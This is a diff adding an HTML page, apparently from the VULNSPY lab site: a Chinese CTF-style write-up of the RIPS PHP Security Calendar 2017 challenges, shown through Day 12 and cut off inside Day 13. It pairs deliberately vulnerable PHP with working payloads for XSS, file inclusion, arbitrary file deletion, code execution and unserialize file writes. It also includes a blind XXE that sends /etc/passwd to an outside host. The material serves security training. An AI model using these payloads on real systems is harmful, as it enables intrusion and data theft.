@@ -1,0 +1,1240 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="author" content="Ambulong">
+<meta name="description" content="RIPSTECH PRESENTS PHP SECURITY CALENDAR 是由 RIPS 团队出品的PHP代码安全审计挑战系列题目，RIPSTECH PRESENTS PHP SECURITY CALENDAR 2017 共包含24道题目，每道题目将包含一个较新颖的知识点供大家学习。该教程将使用 VULNSPY 的在线测试环境来演示这系列题目漏洞利用演示。">
+<meta name="keywords" content="php security,rips,ripstech,calendar,2017,online,在线环境,演示,exp,exploit,security,practict,在线靶场,黑客技术,网络安全,信息安全,漏洞测试,CTF在线,渗透测试,在线练习,演练,实验,pentest,online">
+<title>RIPS 2017 PHP代码安全审计挑战在线测试环境/Writeup | VULNSPY</title>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+<script src="/js/jquery-1.11.3.min.js"></script>
+<script src="/js/jquery-migrate-1.2.1.min.js"></script>
+<link href="/css/bootstrap.min.css" rel="stylesheet">
+<link href="/css/ie10-viewport-bug-workaround.css" rel="stylesheet">
+<!--[if lt IE 9]><script src="/js/ie8-responsive-file-warning.js"></script><![endif]-->
+<script src="/js/ie-emulation-modes-warning.js"></script>
+<!--[if lt IE 9]>
+<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+<![endif]-->
+<script src="/js/bootstrap.min.js"></script>
+<!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
+<script src="/js/ie10-viewport-bug-workaround.js"></script>
+<link rel="stylesheet" href="/css/custom.css" />
+<link rel="stylesheet" href="css/prism.css" />
+<script src="/js/functions.js"></script>
+<script src="/js/custom.js"></script>
+<script>
+function GetQueryString(name)
+{
+     var reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)");
+     var r = window.location.search.substr(1).match(reg);
+     if(r!=null)return  unescape(r[2]); return null;
+}
+var lang="en";
+var la=(navigator.language) ? navigator.language.toLowerCase() : navigator.userLanguage.toLowerCase();
+if(la=='zh-cn' || la=='zh-tw' || la=='zh-hk'){
+	lang="cn";
+}
+</script>
+<!--[if lt IE 9]>
+	<script src="http://css3-mediaqueries-js.googlecode.com/svn/trunk/css3-mediaqueries.js"></script>
+<![endif]-->
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-108901411-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-108901411-2');
+</script>
+</head>
+<body>
+<div class="view-header" style="z-index: 999;">
+    <ul>
+    	<li><a href="/"><h1><img style="width:1.5em;height: auto;margin-top: -0.3em;" src="/images/owl2.png" /></h1></a></li>
+        <li ><a href="/">VULNSPY</a></li>
+        <li><a href="https://blog.vulnspy.com/">BlOG</a></li>
+        <div class="pull-right">
+            <li><a target="_blank" href="https://www.reddit.com/r/jiuwu/">REDDIT</a></li>
+            <li><a target="_blank" href="https://www.youtube.com/channel/UCnqjUDkrZ0OFwZvxxiC47gw">YOUTUBE CHANNEL</a></li>
+        </div>
+    </ul>
+</div>
+<style>
+.main{
+	
+	margin: 0 auto;
+	margin-top: 7em;
+	max-width: 90em;
+	width: 95%;
+}
+.lab{
+	float:left;
+	width: 77%;
+}
+.lab h1{
+	padding: 0;
+	font-size: 230%;
+	margin: 20px 0;
+	line-height: 1.5em;
+}
+
+.lab .demo{
+	font-size: 115%;
+	line-height: 2em;
+	border: 1px solid #ccc;
+	background: #2C3844;
+	margin: 1.8em 0 1em 0;
+}
+.lab .demo .demo-btn{
+	text-align: center;
+	font-size: 150%;
+	margin: 0.3em 0;
+	color: #FFF;
+}
+.lab .demo .demo-btn a{
+	background: transparent;
+	padding: 1em;
+	font-size: 100%;
+	display: block;
+	
+}
+.lab .demo .demo-link{
+	background: rgba(0,0,0,.25);
+}
+.lab .demo a{
+	font-size: 50%;
+	text-transform: uppercase;
+	padding: 0 0.5em;
+	color: #FFF;
+}
+.lab .content{
+	font-size: 130%;
+	line-height: 1.5em;
+}
+.lab .content p{
+	margin: 1em 0;
+}
+.lab .content img{
+	max-width: 100%;
+	margin: 1em 0;
+}
+.sidebar{
+	width: 23%;
+	float: left;
+	padding-left: 2em;
+	margin-top: 20px;
+}
+.sidebar .sth-btn {
+	width: 100%;
+	margin-left: 1em;
+}
+#sth {
+	display: block;
+	text-align: center;
+	text-transform: uppercase;
+	padding: 0.8em 1em;
+	font-size:123%;
+	border: none;
+	border-radius: 0;
+	background: #337ab7;
+	color: #FFF;
+	font-weight: bold;
+}
+#demo-notice {
+	width: 100%;
+	margin: 0.8em 0;
+	font-size: 90%;
+	text-align: center;
+	color: #777;
+	word-break:break-all;
+}
+.sidebar ul{
+	margin: 2em 0;
+	padding: 0;
+}
+.sidebar ul ul{
+	margin: 0;
+	margin-left: 1em;
+}
+.sidebar li{
+	margin: 0 0 0.5em 0;
+	font-size: 110%;
+	list-style: none;
+	color: #767676;
+	border-left: solid 0.1em #FFF;
+	padding-left: 1em;
+	margin-left: 1em;
+	cursor: pointer;
+}
+.sidebar li.selected{
+	color: #2C3844;
+	border-left: solid 0.1em #2C3844;
+}
+.sidebar li:hover{
+	color: #2C3844;
+	border-left: solid 0.1em #2C3844;
+}
+</style>
+<div class="main">
+	<div class="lab">
+		<h1>RIPS 2017 PHP代码安全审计挑战在线测试环境/Writeup</h1>
+		<hr/>
+		<div class="content"><p><img src="/images/en-ripstech-presents-php-security-calendar-2017/default.png" alt="" /></p>
+<p>题目原地址： PHP Security Advent Calendar 2017 - <a href="https://www.ripstech.com/php-security-calendar-2017/">https://www.ripstech.com/php-security-calendar-2017/</a></p>
+<p>RIPSTECH PRESENTS PHP SECURITY CALENDAR 是由 RIPS 团队出品的PHP代码安全审计挑战系列题目，RIPSTECH PRESENTS PHP SECURITY CALENDAR 2017 共包含24道题目（Day 1 ~ 24），每道题目将包含一个较新颖的知识点供大家学习。</p>
+<p>该教程将使用 VULNSPY 的<a href="(https://github.com/vulnspy/ripstech-php-security-calendar-2017)">在线测试环境</a>来演示这系列题目漏洞利用演示。</p>
+<p><strong>点击右上角的<code>START TO HACK</code>可自动创建在线实验环境</strong></p>
+<p>实验环境源码：<a href="https://github.com/vulnspy/ripstech-php-security-calendar-2017">https://github.com/vulnspy/ripstech-php-security-calendar-2017</a></p>
+<hr />
+<p>下列内容来自 <a href="https://github.com/spoock1024/CTF-Practice/blob/830069f31248dcefe7eb5df02233843763ab955a/PHP%20SECURITY%20CALENDAR%202017/README_CN.md">spoock1024/CTF-Practice/PHP SECURITY CALENDAR 2017/README_CN.md</a></p>
+<h3>Day 1 - Wish List</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">class Challenge {
+    const UPLOAD_DIRECTORY = './solutions/';
+    private $file;
+    private $whitelist;
+
+    public function __construct($file) {
+        $this-&gt;file = $file;
+        $this-&gt;whitelist = range(1, 24);
+    }
+
+    public function __destruct() {
+        if (in_array($this-&gt;file['name'], $this-&gt;whitelist)) {
+            move_uploaded_file(
+                $this-&gt;file['tmp'],
+                self::UPLOAD_DIRECTORY . $this-&gt;file['name']
+            );
+        }
+    }
+}
+
+$challenge = new Challenge($_FILES['solution']);</code></pre>
+<p>在代码的 13 行存在任意文件上传漏洞。 在 12 行代码通过 <code>in_array()</code> 来判断文件名是否为整数，可是未将 <code>in_array()</code> 的第三个参数设置为 <code>true</code> 。<code>in_array()</code>的第三个参数在默认情况下是<code>false</code>，因此 PHP 会尝试将文件名自动转换为整数再进行判断，导致该判断可被绕过。比如使用文件名为 <code>5vulnspy.php</code> 的文件将可以成功通过 <code>in_array($this-&gt;file['name'], $this-&gt;whitelist)</code> 判断，从而将恶意的 PHP 文件上传到服务器。</p>
+<p>如下所示:</p>
+<pre><code class="language-php">$myarray = range(1,24); 
+in_array('5vulnspy.php',$myarray);         //true
+in_array('5vulnspy.php',$myarray,true);    //false</code></pre>
+<h3>Day 2 - Twig</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">// composer require "twig/twig"
+require 'vendor/autoload.php';
+
+class Template {
+    private $twig;
+
+    public function __construct() {
+        $indexTemplate = '&lt;img ' .
+            'src="https://loremflickr.com/320/240"&gt;' .
+            '&lt;a href="{{link|escape}}"&gt;Next slide »&lt;/a&gt;';
+
+        // Default twig setup, simulate loading
+        // index.html file from disk
+        $loader = new Twig\Loader\ArrayLoader([
+            'index.html' =&gt; $indexTemplate
+        ]);
+        $this-&gt;twig = new Twig\Environment($loader);
+    }
+
+    public function getNexSlideUrl() {
+        $nextSlide = $_GET['nextSlide'];
+        return filter_var($nextSlide, FILTER_VALIDATE_URL);
+    }
+
+    public function render() {
+        echo $this-&gt;twig-&gt;render(
+            'index.html',
+            ['link' =&gt; $this-&gt;getNexSlideUrl()]
+        );
+    }
+}
+
+(new Template())-&gt;render();</code></pre>
+<p>在 26 行存在XSS漏洞。该题首先使用 <code>filter_var()</code> 函数来判断了传入参数是否合法的URL（第22行），然后再次使用模板引擎 <code>Twig</code> 自带的方法来转义URL（第10行）。</p>
+<p><code>filter_var</code>的URL过滤非常的弱，只是单纯的从形式上检测并没有检测协议。测试如下：</p>
+<pre><code class="language-php">var_dump(filter_var('vulnspy.com', FILTER_VALIDATE_URL));           # false
+var_dump(filter_var('http://vulnspy.com', FILTER_VALIDATE_URL));    # http://vulnspy.com
+var_dump(filter_var('xxxx://vulnspy.com', FILTER_VALIDATE_URL));    # xxxx://vulnspy.com
+var_dump(filter_var('http://vulnspy.com&gt;', FILTER_VALIDATE_URL));   # false</code></pre>
+<p><code>Twig</code>中的<code>{{link|escape}}</code>中的<code>escape</code>和PHP中的<code>htmlspecialchars($link, ENT_QUOTES, 'UTF-8')</code>类似，所以单引号和双引号等都无法使用。</p>
+<p>因为<code>%250a</code>即<code>%0a</code>表示换行符，在浏览器中<code>javascript://comment%250aalert(1)</code>会被解释为：</p>
+<pre><code class="language-javascript">javascript://comment
+alert(1)</code></pre>
+<p><code>//</code>在 Javascript 中表示注释符，因此<code>comment</code>会被忽略，执行<code>alert(1)</code>。</p>
+<p>我们可以使用 Payload ：<code>?nextSlide=javascript://comment%250aalert(1)</code> 来绕过过滤。</p>
+<h3>Day 3 - Snow Flake</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">function __autoload($className) {
+    include $className;
+}
+
+$controllerName = $_GET['c'];
+$data = $_GET['d'];
+
+if (class_exists($controllerName)) {
+    $controller = new $controllerName($data);
+    $controller-&gt;render();
+} else {
+    echo 'There is no page with this name';
+}
+
+class HomeController {
+    private $data;
+
+    public function __construct($data) {
+        $this-&gt;data = $data;
+    }
+
+    public function render() {
+        if ($this-&gt;data['new']) {
+            echo 'controller rendering new response';
+        } else {
+            echo 'controller rendering old response';
+        }
+    }
+}</code></pre>
+<p>在第8行中的<code>class_exists()</code>会检查是否存在对应的类，当调用<code>class_exists()</code>函数时会触发用户定义的<code>__autoload()</code>函数，用于加载找不到的类。关于<code>class_exist()</code>和<code>__autoload()</code>的用法，可以参考<a href="https://stackoverflow.com/questions/3812851/there-is-a-way-to-use-class-exists-and-autoload-without-crash-the-script">stackoverflow:class_exists&amp;autoload</a>。
+除此之外，还有很多的函数在调用<code>__autoload()</code>的方法，如下：</p>
+<pre><code class="language-PHP">call_user_func()
+call_user_func_array()
+class_exists()
+class_implements()
+class_parents()
+class_uses()
+get_class_methods()
+get_class_vars()
+get_parent_class()
+interface_exists()
+is_a()
+is_callable()
+is_subclass_of()
+method_exists()
+property_exists()
+spl_autoload_call()
+trait_exists()</code></pre>
+<p>所以如果我们输入<code>../../../../etc/passwd</code>是，就会调用<code>class_exists()</code>，这样就会触发<code>__autoload()</code>,这样就是一个任意文件包含的漏洞了，这个漏洞在<code>PHP 5.4</code>中已经被修复了。</p>
+<p>除了这个问题之外，还存在一个<code>blind xxe</code>的漏洞，由于存在<code>class_exists()</code>，所以我们可以调用PHP的内置函数,并且通过<code>$controller = new $controllerName($data);</code>进行实例化。但是这样又如何造成漏洞呢?这个时候就需要借助与PHP中的<code>SimpleXMLElement</code>类来完成XXE攻击。关于这个攻击手法，可以参见<a href="https://blog.ripstech.com/2017/shopware-php-object-instantiation-to-blind-xxe/">shopware blind xxe</a>和<a href="http://bobao.360.cn/learning/detail/3082.html">我是如何黑掉“Pornhub”来寻求乐趣和赢得10000$的奖金</a>。其中都有讲到利用<code>SimpleXMLElement</code>类实施XXE漏洞。那么在本例中，我们实施blind XXE也是十分的简单。
+访问攻击页面：</p>
+<pre><code>http://localhost/risp/xxe/test2.php?c=SimpleXMLElement&amp;d=&lt;!DOCTYPE ANY[
+&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % remote SYSTEM "http://外网地址/evil.dtd"&gt;
+%remote;
+%send;
+]&gt;</code></pre>
+<p>其中的<code>evil.dtd</code>内容是:</p>
+<pre><code class="language-XML">&lt;!ENTITY % all
+        "&lt;!ENTITY &amp;#x25; send SYSTEM '外网地址/1.php?file=%file;'&gt;"
+        &gt;
+        %all;</code></pre>
+<p>其中的<code>1.php</code>的地址是：</p>
+<pre><code class="language-PHP">file_put_contents("result.txt", $_GET['file']);</code></pre>
+<p>这样就完成了攻击。</p>
+<h3>Day 4 - False Beard</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">class Login {
+    public function __construct($user, $pass) {
+        $this-&gt;loginViaXml($user, $pass);
+    }
+
+    public function loginViaXml($user, $pass) {
+        if (
+            (!strpos($user, '&lt;') || !strpos($user, '&gt;')) &amp;&amp;
+            (!strpos($pass, '&lt;') || !strpos($pass, '&gt;'))
+        ) {
+            $format = '&lt;xml&gt;&lt;user="%s"/&gt;&lt;pass="%s"/&gt;&lt;/xml&gt;';
+            $xml = sprintf($format, $user, $pass);
+            $xmlElement = new SimpleXMLElement($xml);
+            // Perform the actual login.
+            $this-&gt;login($xmlElement);
+        }
+    }
+}
+
+new Login($_POST['username'], $_POST['password']);</code></pre>
+<p>虽然这道题目出现了<code>XML</code>，但是考察的确实<code>strpos</code>的用法和PHP的自动类型转换的问题。分别说明：</p>
+<pre><code class="language-PHP">var_dump(strpos('abcd','a'));       # 0
+var_dump(strpos('abcd','x'));       # false</code></pre>
+<p>但是由于PHP的自动类型转换的关系，<code>0</code>和<code>false</code>是相等的，如下：</p>
+<pre><code class="language-PHP">var_dump(0==false);         # true</code></pre>
+<p>所以如果我们传入的<code>username</code>和<code>password</code>的首位字符是<code>&lt;</code>或者是<code>&gt;</code>就可以绕过限制，那么最后的pyaload就是：</p>
+<pre><code>username=&lt;"&gt;&lt;injected-tag%20property="&amp;password=&lt;"&gt;&lt;injected-tag%20property="</code></pre>
+<p>最终传入到<code>$this-&gt;login($xmlElement)</code>的<code>$xmlElement</code>值是<code>&lt;xml&gt;&lt;user="&lt;"&gt;&lt;injected-tag property=""/&gt;&lt;pass="&lt;"&gt;&lt;injected-tag property=""/&gt;&lt;/xml&gt;</code>这样就可以进行注入了。</p>
+<h3>Day 5 - Postcard</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-PHP">class Mailer {
+    private function sanitize($email) {
+        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+            return '';
+        }
+
+        return escapeshellarg($email);
+    }
+
+    public function send($data) {
+        if (!isset($data['to'])) {
+            $data['to'] = 'none@vsplate.com';
+        } else {
+            $data['to'] = $this-&gt;sanitize($data['to']);
+        }
+
+        if (!isset($data['from'])) {
+            $data['from'] = 'none@vsplate.com';
+        } else {
+            $data['from'] = $this-&gt;sanitize($data['from']);
+        }
+
+        if (!isset($data['subject'])) {
+            $data['subject'] = 'No Subject';
+        }
+
+        if (!isset($data['message'])) {
+            $data['message'] = '';
+        }
+
+        mail($data['to'], $data['subject'], $data['message'],
+             '', "-f" . $data['from']);
+    }
+}
+
+$mailer = new Mailer();
+$mailer-&gt;send($_POST);</code></pre>
+<p>这个漏洞其实就是<code>mail()</code>函数的漏洞，我们同样需要通过<code>mail()</code>中的第五个参数以<code>-X</code>的方式写入webshell。但是中途进行了两次过滤，分别是<code>filter_var($email, FILTER_VALIDATE_EMAIL)</code>和<code>escapeshellarg($email)</code>。我们接下来分别分析这两个过滤函数。</p>
+<ul>
+<li><code>filter_var()</code>函数的过滤过滤，可以参考这篇文章<a href="https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly">PHP FILTER_VALIDATE_EMAIL</a>，其中说明了<code>none of the special characters in this local part are allowed outside quotation marks</code>,表示所有的特殊符号必须放在双引号中。<code>filter_var</code>问题在于，我们能够在双引号中嵌套转义空格仍然能够通过检测。同时由于底层正则表达式的原因，我们通过重叠单引号和双引号，欺骗<code>filter_val</code>使其认为我们仍然在双引号中，我们就可以绕过检测。如下：</li>
+</ul>
+<pre><code class="language-PHP">var_dump(filter_var('\'is."\'\ not\ allowed"@vsplate.com',FILTER_VALIDATE_EMAIL));      # true
+var_dump(filter_var('"is.\ not\ allowed"@vsplate.com',FILTER_VALIDATE_EMAIL));          # true
+var_dump(filter_var('"is.""\ not\ allowed"@vsplate.com',FILTER_VALIDATE_EMAIL));        # false</code></pre>
+<p>escapeshellarg，将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号。如下：</p>
+<pre><code class="language-PHP">var_dump(escapeshellarg("123"));            # '123'
+var_dump(escapeshellarg("12'  3"));         # '12'\''  3'</code></pre>
+<p>前面说到<code>filter</code>会混淆单双引号，但是<code>escapeshellarg()</code>并不会混淆单双引号，如下：</p>
+<pre><code class="language-PHP">var_dump(escapeshellarg("'is.\"'\ not\ allowed\"@vsplate.com"));        # ''\''is."'\''\ not\ allowed"@vsplate.com'</code></pre>
+<p>关于mail()函数的漏洞，rips的这篇文章<a href="https://blog.ripstech.com/2017/why-mail-is-dangerous-in-php">Why mail() is dangerous in PHP</a> 说明得十分清除，其中对于<code>escapeshellarg()</code>和<code>filter_var()</code>不安全的问题进行了说明。在国内<a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇</a>对<code>escapeshellarg</code>和<code>escapeshellcmd</code>联合使用从而造成的安全问题也进行了说明。这两篇文章都值得收藏。</p>
+<h3>Day 6 - Frost Pattern</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">class TokenStorage {
+    public function performAction($action, $data) {
+        switch ($action) {
+            case 'create':
+                $this-&gt;createToken($data);
+                break;
+            case 'delete':
+                $this-&gt;clearToken($data);
+                break;
+            default:
+                throw new Exception('Unknown action');
+        }
+    }
+
+    public function createToken($seed) {
+        $token = md5($seed);
+        file_put_contents('/tmp/tokens/' . $token, '...data');
+    }
+
+    public function clearToken($token) {
+        $file = preg_replace("/[^a-z.-_]/", "", $token);
+        unlink('/tmp/tokens/' . $file);
+    }
+}
+
+$storage = new TokenStorage();
+$storage-&gt;performAction($_GET['action'], $_GET['data']);</code></pre>
+<p>本题的问题是在于<code>clearToken()</code>中的正则表达式<code>[^a-z.-_]</code>。按照代码的本意是，是将非<code>a-z</code>、<code>.</code>、<code>-</code>、<code>_</code>全部替换为空。这样<code>../../../</code>目录穿越的方式就无法使用了，因为<code>/</code>会被替换为空。</p>
+<p>但是本题的问题在于<code>[^a-z.-_]</code>中的<code>-</code>没有进行转义。如果<code>-</code>没有进行转义，那么<code>-</code>表示一个列表，例如<code>[1-9]</code>表示的数字1到9，但是如果<code>[1\-9]</code>表示就是字母<code>1</code>、<code>-</code>和<code>9</code>。所以在本题中使用的<code>[^a-z.-_]</code>表示的就是非ascii表中的序号为46至122的字母替换为空。那么此时的<code>../.../</code>就不会被匹配，就可以进行目录穿越，从而造成任意文件删除了。</p>
+<p>最后的pyload可以写为：<code>action=delete&amp;data=../../config.php</code></p>
+<h3>Day 7 - Bells</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">function getUser($id) {
+    global $config, $db;
+    if (!is_resource($db)) {
+        $db = new MySQLi(
+            $config['dbhost'],
+            $config['dbuser'],
+            $config['dbpass'],
+            $config['dbname']
+        );
+    }
+    $sql = "SELECT username FROM users WHERE id = ?";
+    $stmt = $db-&gt;prepare($sql);
+    $stmt-&gt;bind_param('i', $id);
+    $stmt-&gt;bind_result($name);
+    $stmt-&gt;execute();
+    $stmt-&gt;fetch();
+    return $name;
+}
+
+$var = parse_url($_SERVER['HTTP_REFERER']);
+parse_str($var['query']);
+$currentUser = getUser($id);
+echo '&lt;h1&gt;'.htmlspecialchars($currentUser).'&lt;/h1&gt;';</code></pre>
+<p>看到了<code>parse_str</code>就知道这是一个变量覆盖的漏洞。同时<code>$_SERVER['HTTP_REFERER']</code>也是可控的，那么就存在变量覆盖的漏洞了。</p>
+<p>通过变量覆盖漏洞，我们可以覆盖掉<code>$config</code>，使其在我们构造的数据库中进行查询，这样就能够保证我们能够顺利地进行通过验证。</p>
+<p>最后的payload如下：<code>`http://host/?config[dbhost]=10.0.0.5&amp;config[dbuser]=root&amp;config[dbpass]=root&amp;config[dbname]=malicious&amp;id=1</code></p>
+<h3>Day 8 - Candle</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">header("Content-Type: text/plain");
+
+function complexStrtolower($regex, $value) {
+    return preg_replace(
+        '/(' . $regex . ')/ei',
+        'strtolower("\\1")',
+        $value
+    );
+}
+
+foreach ($_GET as $regex =&gt; $value) {
+    echo complexStrtolower($regex, $value) . "\n";
+}</code></pre>
+<p>这道题目也十分的简单，出现了<code>preg_replace('/e','')</code>这种代码，<code>preg_replace</code>在<code>/e</code>模式下能够执行代码如下：</p>
+<pre><code class="language-PHP">preg_replace('/(.*)/e','phpinfo();','xxx');</code></pre>
+<p>这样就能够执行<code>phpinfo()</code>。在本题中，我们可以控制<code>regex</code>和<code>value</code>。但是本题的关键是在于有<code>strtolower()</code>，虽然如此但是<code>strtolower("\\1")</code>使用的是双引号，这样就可以利用php中的<code>"</code>能够执行代码的特性了。最简单的php中双引号的代码执行，如下：</p>
+<pre><code class="language-PHP">"{${phpinfo()}}";</code></pre>
+<p>那么本题的最后的payload可以写为<code>/?.*={${phpinfo()}}</code></p>
+<p>但是这样写是存在问题的，因为在传送请求时,<code>.</code>会被替换为<code>_</code>，所以最后的请求名和参数是:</p>
+<pre><code>_*={${phpinfo()}}`</code></pre>
+<p>这样就无法进行替换了。那么我们最后的payload就可以变通地写为<code>/?{\${\w*\(\)}}={${phpinfo()}}</code></p>
+<h3>Day 9 - Rabbit</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">class LanguageManager
+{
+    public function loadLanguage()
+    {
+        $lang = $this-&gt;getBrowserLanguage();
+        $sanitizedLang = $this-&gt;sanitizeLanguage($lang);
+        require_once("/lang/$sanitizedLang");
+    }
+
+    private function getBrowserLanguage()
+    {
+        $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'en';
+        return $lang;
+    }
+
+    private function sanitizeLanguage($language)
+    {
+        return str_replace('../', '', $language);
+    }
+}
+
+(new LanguageManager())-&gt;loadLanguage();</code></pre>
+<p>这个题目是一个比较明显的任意文件包含的漏洞，主要的漏洞是出在<code>str_replace('../', '', $language)</code>。这个包含只是单次替换而不是循环替换，所以这种替换就很容易被绕过。如<code>..././</code>、<code>....//</code>。其次<code>$_SERVER['HTTP_ACCEPT_LANGUAGE']</code>这个变量是客户端可控的。</p>
+<p>那么最后的请求的payload如下：</p>
+<pre><code>Accept-Language:  .//....//....//etc/passwd</code></pre>
+<h3>Day 10 - Anticipation</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">extract($_POST);
+
+function goAway() {
+    error_log("Hacking attempt.");
+    header('Location: /error/');
+}
+
+if (!isset($pi) || !is_numeric($pi)) {
+    goAway();
+}
+
+if (!assert("(int)$pi == 3")) {
+    echo "This is not pi.";
+} else {
+    echo "This might be pi.";
+}</code></pre>
+<p>虽然这道题目存在<code>extract($_POST);</code>，但并不存在变量覆盖漏洞。
+这个题目存在两个关键的问题：</p>
+<ol>
+<li>使用header()进行跳转的时候没有使用<code>exit()</code>或者是<code>die()</code>，导致后续的代码任然可以执行。</li>
+<li><code>assert()</code>能够执行<code>"</code>中的代码,如<code>assert("(int)phpinfo()");</code></li>
+</ol>
+<p>通过这两点就可以造成任意代码执行。payload为<code>pi=phpinfo()</code>。通过burp就可以看到phpinfo的返回内容。</p>
+<h3>Day 11 - Pumpkin Pie</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">class Template {
+    public $cacheFile = '/tmp/cachefile';
+    public $template = '&lt;div&gt;Welcome back %s&lt;/div&gt;';
+
+    public function __construct($data = null) {
+        $data = $this-&gt;loadData($data);
+        $this-&gt;render($data);
+    }
+
+    public function loadData($data) {
+        if (substr($data, 0, 2) !== 'O:' 
+        &amp;&amp; !preg_match('/O:\d:\{/', $data)) {
+            return unserialize($data);
+        }
+        return [];
+    }
+
+    public function createCache($file = null, $tpl = null) {
+        $file = $file ?? $this-&gt;cacheFile;
+        $tpl = $tpl ?? $this-&gt;template;
+        file_put_contents($file, $tpl);
+    }
+
+    public function render($data) {
+        echo sprintf(
+            $this-&gt;template,
+            htmlspecialchars($data['name'])
+        );
+    }
+
+    public function __destruct() {
+        $this-&gt;createCache();
+    }
+}
+
+new Template($_COOKIE['data']);</code></pre>
+<p><strong>源代码中12行存在问题，其中的<code>O:\d:\{</code>需要修改为<code>O:\d:</code></strong></p>
+<p>代码中的<code>??</code>是php7中新的语法糖。<code>??</code>的含义是</p>
+<blockquote>
+<p>由于日常使用中存在大量同时使用三元表达式和 isset()的情况， 我们添加了null合并运算符 (??) 这个语法糖。如果变量存在且值不为NULL， 它就会返回自身的值，否则返回它的第二个操作数。</p>
+</blockquote>
+<p>这道题目使用了<code>unserialize()</code>和<code>__destruct</code>，是考察反序列化漏洞的典型套路。题目的本意很简单，将页面上的内容<code>&lt;div&gt;Welcome back %s&lt;/div&gt;</code>最后输出到<code>/tmp/cachefile</code>文件中。而题目最大的问题是需要绕过：</p>
+<ol>
+<li><code>substr($data, 0, 2) !== 'O:'</code></li>
+<li><code>preg_match('/O:\d:/', $data)</code></li>
+</ol>
+<p>第一个通过数组的方式就可以绕过，而第二个的绕过则需要利用到PHP中的反序列化的一个BUG，只需要在对象长度前添加一个+号，即o:14-&gt;o:+14，这样就可以绕过正则匹配。关于这个BUG的具体分析，可以参见<a href="http://www.phpbug.cn/archives/32.html">php反序列unserialize的一个小特性</a>。</p>
+<p>知道了漏洞原理，接下来就是构造payload了</p>
+<pre><code class="language-PHP">class Template {
+    public $cacheFile = '/var/www/html/info.php';
+    public $template = '&lt;?php phpinfo();';
+}
+$mytemp = new Template();
+$myarray = array('name'=&gt;'test',$mytemp);
+$myarray = serialize($myarray);
+var_dump($myarray);</code></pre>
+<p><strong>解答</strong>
+得到输出为<code>a:2:{s:4:"name";s:4:"test";i:0;O:8:"Template":2:{s:9:"cacheFile";s:22:"/var/www/html/info.php";s:8:"template";s:16:"&lt;?php phpinfo();";}}</code></p>
+<p>由于需要绕过<code>preg_match('/O:\d:/', $data)</code>，需要将<code>0:8</code>变为<code>0:+8</code>,则最后的payload为：</p>
+<pre><code>a:2:{s:4:"name";s:4:"test";i:0;O:+8:"Template":2:{s:9:"cacheFile";s:22:"/var/www/html/info.php";s:8:"template";s:16:"&lt;?php phpinfo();";}}</code></pre>
+<h3>Day 12 - String Lights</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">$sanitized = [];
+
+foreach ($_GET as $key =&gt; $value) {
+    $sanitized[$key] = intval($value);
+}
+
+$queryParts = array_map(function ($key, $value) {
+    return $key . '=' . $value;
+}, array_keys($sanitized), array_values($sanitized));
+
+$query = implode('&amp;', $queryParts);
+
+echo "&lt;a href='/images/size.php?" .
+    htmlentities($query) . "'&gt;link&lt;/a&gt;";</code></pre>
+<p>看最后的输出，猜测可能是一个XSS的问题。本题目的关键是在于<code>$sanitized[$key] = intval($value);</code>，同时漏洞也是出自于<code>$sanitized[$key] = intval($value);</code>。这行代码主要就是的作用就是传入的<code>$value</code>进行过滤变为<code>intval($value)</code>，之后再次经过<code>htmlentities</code>进行过滤拼接到<code>&lt;a&gt;</code>标签中作为<code>/images/size.php</code>的参数。</p>
+<p>上述代码的问题在于：</p>
+<ol>
+<li><code>$sanitized[$key] = intval($value)</code>只过滤了value，没有对key进行过滤；</li>
+<li><code>htmlentities</code>默认情况下不会对单引号进行转义。</li>
+</ol>
+<p>那么我们的XSS攻击就可以通过在标签<code>&lt;a&gt;</code>中增加一个<code>onclick</code>的点击事件触发。最后的payload如下<code>a%27onclick%3Dalert%281%29%2f%2f=c</code></p>
+<h3>Day 13 - Turkey Baster</h3>
+<p>你能从下列代码中发现安全漏洞吗？</p>
+<pre><code class="language-php">class LoginManager {
+    private $em;
+    private $user;
+    private $password;
+
+    public function __construct($user, $password) {
+        $this-&gt;em = DoctrineManager::getEntityManager();
+        $this-&gt;user = $user;
+        $this-&gt;password = $password;
+    }
+
+    public function isValid() {
+        $user = $this-&gt;sanitizeInput($this-&gt;user);
+        $pass = $this-&gt;sanitizeInput($this-&gt;password);
+
